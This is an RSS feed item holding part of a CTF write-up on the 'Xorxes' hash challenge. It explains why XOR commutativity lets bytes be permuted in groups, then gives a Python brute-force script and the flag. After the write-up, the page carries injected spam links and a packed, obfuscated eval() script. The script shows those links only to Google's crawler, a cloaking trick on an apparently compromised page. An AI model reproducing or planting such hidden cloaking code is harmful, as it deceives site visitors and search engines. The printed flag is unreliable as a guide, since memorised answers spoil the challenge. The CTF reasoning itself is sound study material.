+#&lt;/pre&gt;&lt;p&gt;You can see, that hash function is very simple. It&#039;s just xors SHA224 hash for every byte of message together and shift buffer to the right, after each xoring. We can rewrite function a bit:&lt;/p&gt;&lt;p&gt;&lt;em&gt;Xorxes(m) =R(...R( R(IV + H(m[0]) ) + H(m[1]) )...) + H(m[len(m)-1]) + len%24,&lt;/em&gt;&lt;/p&gt;&lt;p&gt;where R is a right shifting, H is a SHA224 hash and + is a xor, m[i] is a i-byte of message. But xoring is a commutative operation and &amp;nbsp;right shifting is distributive over xor. So we can open bracers and get:&lt;/p&gt;&lt;p&gt;&lt;em&gt;Xorxes(m) = R&lt;sup&gt;len(m)-1&lt;/sup&gt;(IV) + R&lt;sup&gt;len(m)-1&lt;/sup&gt;(H(m[0])) + R&lt;span style=&quot;position: relative; font-size: 11px; line-height: 0; vertical-align: baseline; top: -0.5em;&quot;&gt;len(m)-2&lt;/span&gt;(H(m[1])) + R&lt;span style=&quot;position: relative; font-size: 11px; line-height: 0; vertical-align: baseline; top: -0.5em;&quot;&gt;len(m)-3&lt;/span&gt;(H(m[2])) + ... + R(H(m[len(m)-2])) + H(m[len(m)-1])&lt;/em&gt;&lt;/p&gt;&lt;p&gt;We can also notice, thath R&lt;sup&gt;4&lt;/sup&gt; = R&lt;sup&gt;0&lt;/sup&gt; (cos shifting buffer of length 224 &amp;nbsp;four times to the right equal to not shifting at all), so all addends will be splited in four groups:&lt;/p&gt;&lt;p&gt;&lt;em&gt;Xorxes(m) = {H(m[len(m)-1]) + H(m[len(m)-5]) + ... &amp;nbsp;} + R({ H(m[len(m)-2]) + H(m[len(m)-6]) + ... &amp;nbsp;}) + R&lt;sup&gt;2&lt;/sup&gt;({ H(m[len(m)-3) + H(m[len(m)-7]) + ... &amp;nbsp;}) + R&lt;sup&gt;3&lt;/sup&gt;({ H(m[len(m)-4) + H(m[len(m)-8]) + ... &amp;nbsp;}) + R&lt;span style=&quot;position: relative; font-size: 11px; line-height: 0; vertical-align: baseline; top: -0.5em;&quot;&gt;len(m)-1&lt;/span&gt;(IV)&lt;/em&gt;&lt;/p&gt;&lt;p&gt;Now it&#039;s obvious, that hash doesn&#039;t depent on order of bytes of each group in message due to commutativity of xor operation. And message &quot;11112222&quot; will have same hash as &quot;22221111&quot; and &quot;12122121&quot;. So we can split bytes of given message and generate new messages as all possible permutation of this bytes inside their own groups. Thoose new messags will ahve same hash like original messages. And then we must find one message with md5 hash &#039;7179926e4253a0b405090df67f62c543&#039;.&lt;/p&gt;&lt;p&gt;So let&#039;s do some python here:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;#!/usr/bin/python
+import itertools
+import hashlib
+import sys
+
+MD5 = &#039;7179926e4253a0b405090df67f62c543&#039;
+
+group1 = &quot;Ktrno&quot;
+group2 = &quot;luai&quot;
+group3 = &quot;abdk&quot;
+group4 = &quot;aaat&quot;
+
+all_variants = 24*24*24*120
+count = 0
+
+for g1 in itertools.permutations(group1):
+	for g2 in itertools.permutations(group2):
+		for g3 in itertools.permutations(group3):
+			for g4 in itertools.permutations(group4):
+				result = &#039;&#039;
+				for i in xrange(0,17,1):
+					if i%4 ==0:
+						result+=(g1[i/4])
+					if i%4 ==1:
+						result+=(g2[i/4])
+					if i%4 ==2:
+						result+=(g3[i/4])
+					if i%4 ==3:
+						result+=(g4[i/4])
+				md5 = hashlib.new(&#039;md5&#039;)
+				md5.update(result)
+				hashed = md5.hexdigest()
+				if hashed == MD5:
+					print &quot;Flag: &quot; + result
+					exit(0)
+	count+=13824
+	sys.stdout.write( &quot;Progress: &quot; + str(100*count/all_variants) + &quot;%\r&quot; )
+	sys.stdout.flush()&lt;/pre&gt;&lt;p&gt;It takes some time to generate all possible 4!*4!*4!*5! = 1658880 variants, but after several seconds we get a flag:&amp;nbsp;radaniktKlaatubao&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Flag: radaniktKlaatubao&lt;/strong&gt;&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.runtrendy.com/&quot;&gt;Running Sneakers Store&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.oft.gov.gi/index.php/eeabaikshop/2021/02/preview-nike-air-force-1-fauna-brown-dj9941-244/&quot;&gt;Preview: Nike Air Force 1 &quot;Tear-Away&quot; Fauna Brown - Gov&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-file field-type-file field-label-above&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Attachments:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Plain text icon&quot; title=&quot;text/plain&quot; src=&quot;/modules/file/icons/text-plain.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/xorxes-ad7b52380d3ec704b28954c80119789a.py.txt&quot; type=&quot;text/plain; length=1117&quot;&gt;xorxes-ad7b52380d3ec704b28954c80119789a.py.txt&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;field-item odd&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Plain text icon&quot; title=&quot;text/plain&quot; src=&quot;/modules/file/icons/text-plain.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/xorxer_bruter.py_0.txt&quot; type=&quot;text/plain; length=842&quot;&gt;xorxer_bruter.py.txt&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Sat, 01 Mar 2014 12:13:05 +0000</pubDate>
+ <dc:creator>Triff</dc:creator>
+ <guid isPermaLink="false">29 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/29#comments</comments>
+</item>
+</channel>
+</rss>
